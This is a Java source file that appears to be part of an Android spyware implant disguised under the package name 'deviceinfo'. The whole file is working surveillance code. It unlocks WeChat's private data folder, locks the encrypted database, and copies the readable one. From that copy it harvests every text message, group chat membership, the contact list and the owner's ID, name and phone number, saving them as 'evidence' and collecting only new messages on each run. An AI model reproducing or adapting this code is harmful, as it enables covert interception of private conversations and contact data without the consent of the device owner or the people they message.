package com.android.deviceinfo.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.deviceinfo.Messages;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.deviceinfo.util.Utils;

public class ChatWeChat extends SubModuleChat {
	private static final String TAG = "ChatWeChat";

	private static final int PROGRAM = 0x0a;

	private static final String DEFAULT_LOCAL_NUMBER = "local";
	String pObserving = "com.tencent.mm";

	// private String myPhoneNumber = "local";
	String myId;
	String myName;
	String myPhone = DEFAULT_LOCAL_NUMBER;

	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Long lastLine;

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}

		readChatWeChatMessages();

	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		readChatWeChatMessages();

	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	/**
	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
	 * messaggi relativi
	 * 
	 * @throws IOException
	 */
	private void readChatWeChatMessages() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}

			return;
		}

		try {
			boolean updateMarkup = false;
			String dbEncFile = "EnMicroMsg.db";
			String dbFile = "MicroMsg.db";
			String dbDir = "";

			lastLine = markup.unserialize(new Long(0));

			// Get DB Dir
			Path.unprotect("/data/data/com.tencent.mm/MicroMsg/");

			// Not the cleanest solution, we should figure out how the hash is
			// generated
			File fList = new File("/data/data/com.tencent.mm/MicroMsg/");
			File[] files = fList.listFiles();

			for (File f : files) {
				// Database directory is an md5 hash name
				// "671d5d475506b864194891d6a4d018e3"
				if (f.isDirectory() && f.getName().length() == 32) {
					dbDir = f.getName();
					break;
				}
			}

			if (dbDir.length() == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatWhatsappMessages): Database directory not found"); //$NON-NLS-1$
				}

				return;
			}

			// Lock encrypted DB
			dbDir = "/data/data/com.tencent.mm/MicroMsg/" + dbDir + "/";

			// chmod 000, chown root:root
			Path.lock(dbDir + dbEncFile);

			if (Path.unprotect(dbDir, dbFile, true)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}

				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				helper.deleteAtEnd = false;

				setMyAccount(helper);
				ChatGroups groups = getChatGroups(helper);

				// Save contacts if AddressBook is active
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveWechatContacts(helper);
				}

				long newLastLine = fetchMessages(helper, groups, lastLine);

				helper.deleteDb();

				if (newLastLine > lastLine) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): updating markup");
					}
					try {
						markup.writeMarkupSerializable(new Long(newLastLine));
					} catch (IOException e) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readChatWeChatMessages) Error: " + e);
						}
					}
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
			}
		} finally {

			readChatSemaphore.release();
		}
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	private long fetchMessages(GenericSqliteHelper helper, final ChatGroups groups, long lastLine) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sqlquery = "select m.createTime, m.talker, m.isSend, m.content, c.nickname from message as m join rcontact as c on m.talker=c.username where m.type = 1 and createTime > ? order by createTime";
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				Date date = new Date(createTime);
				String talker = cursor.getString(1);
				int isSend = cursor.getInt(2);
				boolean incoming = isSend == 0;
				String content = cursor.getString(3);
				String nick = cursor.getString(4);
				String from_id = talker;
				String to_id = talker;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s: %s(%s) %s %s", date, nick, talker, content, (incoming ? "INCOMING"
							: "OUTGOING"));
				}
				String from_name, to;

				if (talker.endsWith("@chatroom")) {
					List<String> lines = Arrays.asList(content.split("\n"));
					if (incoming) {

						from_id = lines.get(0).trim();
						from_id = from_id.substring(0, from_id.length() - 1);

						from_name = groups.getName(from_id);
						to = groups.getGroupToName(from_name, talker);
						to_id = groups.getGroupToId(from_name, talker);

						content = StringUtils.join(lines, "", 1);
					} else {
						from_name = myName;
						from_id = myId;
						to = groups.getGroupToName(myName, talker);
						to_id = groups.getGroupToId(myName, talker);
					}
				} else {
					from_name = incoming ? nick : myName;
					from_id = incoming ? talker : myId;
					to = incoming ? myName : nick;
					to_id = incoming ? myId : talker;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
				}
				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_name, to_id, to, content, incoming);
				messages.add(message);

				return createTime;
			}
		};
		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);

		getModule().saveEvidence(messages);

		return lastCreationLine;
	}

	private void saveWechatContacts(GenericSqliteHelper helper) {
		String[] projection = new String[] { "username", "nickname" };

		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {

			@Override
			public long cursor(Cursor cursor) {

				String username = cursor.getString(0);
				String nick = cursor.getString(1);

				Contact c = new Contact(username, username, nick, "");
				if (username != null && username.startsWith("wxid")) {
					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) need to serialize");
						}
						return 1;
					}
				}
				return 0;
			}
		};

		if (helper.traverseRecords("rcontact", visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveWeChatContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	private void setMyAccount(GenericSqliteHelper helper) {
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				if (id == 2) {
					myId = cursor.getString(2);
				} else if (id == 4) {
					myName = cursor.getString(2);
				} else if (id == 6) {
					myPhone = cursor.getString(2);
				}
				return id;
			}
		};

		long ret = helper.traverseRecords("userinfo", visitor);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
		}

		if (!DEFAULT_LOCAL_NUMBER.equals(myPhone)) {
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myId, myName);
		}
		

	}

	private ChatGroups getChatGroups(GenericSqliteHelper helper) {
		// SQLiteDatabase db = helper.getReadableDatabase();
		final ChatGroups groups = new ChatGroups();
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String key = cursor.getString(0);
				String mids = cursor.getString(2);
				String names = cursor.getString(3);

				String[] ms = mids.split(";");
				String[] ns = names.split(",");

				for (int i = 0; i < ms.length; i++) {
					String id = ms[i].trim();
					String name = ns[i].trim();
					groups.addPeerToGroup(key, new Contact(id, name, name, null));
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getChatGroups) %s", key);
				}
				return 0;

			}
		};

		helper.traverseRecords("chatroom", visitor);

		return groups;
	}
}